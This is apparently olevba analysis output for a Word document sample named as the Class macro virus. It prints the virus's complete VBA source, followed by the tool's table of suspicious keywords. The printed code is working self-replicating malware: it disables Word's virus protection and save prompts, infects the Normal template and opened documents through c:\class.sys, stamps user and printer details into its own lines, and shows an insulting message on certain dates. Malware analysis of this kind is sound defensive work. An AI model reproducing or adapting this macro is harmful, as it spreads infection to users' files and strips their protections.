olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-3afd3080e6e84bdcd0bf18f4024543d032cab775
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-3afd3080e6e84bdcd0bf18f4024543d032cab775 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
On Error GoTo out
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
Options.VirusProtection = False
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
Options.SaveNormalPrompt = False
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
Options.ConfirmConversions = False
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
If nt > 70 And ad > 0 Then GoTo out
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
If nt < 70 Then
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
End If
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
host.codemodule.AddFromFile ("c:\class.sys")
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
With host.codemodule
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    For x = 1 To 4
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    .deletelines 1
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    Next x
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
End With
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
If nt < 70 Then
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    With host.codemodule
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    .replaceline 1, "Sub AutoClose()"
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    .replaceline 71, "Sub ToolsMacro()"
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    End With
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
End If
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
With host.codemodule
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    For x = 2 To 72 Step 2
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
    Next x
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
End With
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
out:
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
End Sub
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
Sub ViewVBCode()
'Monika Vrzalová21.1.1999 13:10:48HP LaserJet 5L (PCL) on LPT2:VrzalSD.DOTSvorka
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

